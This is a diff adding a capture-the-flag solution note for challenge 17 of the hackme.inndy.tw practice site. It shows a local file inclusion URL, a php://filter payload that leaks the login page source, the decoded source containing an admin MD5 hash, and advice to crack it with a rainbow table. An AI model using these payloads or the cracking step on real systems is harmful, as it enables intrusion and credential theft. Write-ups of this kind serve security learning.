@@ -15,6 +15,20 @@
 
 ## 15
   search `FLAG{` on index page
+
+## 17
+  ```
+    # test LFI
+    https://hackme.inndy.tw/lfi/index.php?page=./pages/login
+
+    # get source
+    https://hackme.inndy.tw/lfi/index.php?page=php://filter/read=convert.base64-encode/resource=pages/login
+  ```
+  decode source code
+  ``` bash
+    echo "PD9waHAKcmVxdWlyZSgnY29uZmlnLnBocCcpOwppZigkX1BPU1RbJ3VzZXInXSA9PT0gJ2FkbWluJyAmJiBtZDUoJF9QT1NUWydwYXNzJ10pID09PSAnYmVkMTI4MzY1MjE2YzAxOTk4ODkxNWVkM2FkZDc1ZmInKSB7CiAgICBlY2hvICRmbGFnOwp9IGVsc2Ugewo/Pgo8Zm9ybSBhY3Rpb249Ij9wYWdlPXBhZ2VzL2xvZ2luIiBtZXRob2Q9InBvc3QiIHJvbGU9ImZvcm0iPgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0idXNlci1pIj5Vc2VyPC9sYWJlbD4KCQk8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9InVzZXItaSIgcGxhY2Vob2xkZXI9IlVzZXJuYW1lIiBuYW1lPSJ1c2VyIj4KCTwvZGl2PgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0icGFzcy1pIj5QYXNzd29yZDwvbGFiZWw+CgkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0icGFzcy1pIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIG5hbWU9InBhc3MiPgoJPC9kaXY+Cgk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+TG9naW48L2J1dHRvbj4KPC9mb3JtPgo8P3BocCB9ID8+Cg=="| base64 -d |less
+  ```
+  Get password md5 code, and using the rainbow table attack.
   
 ## 18 homepage
   `f12`->`console`
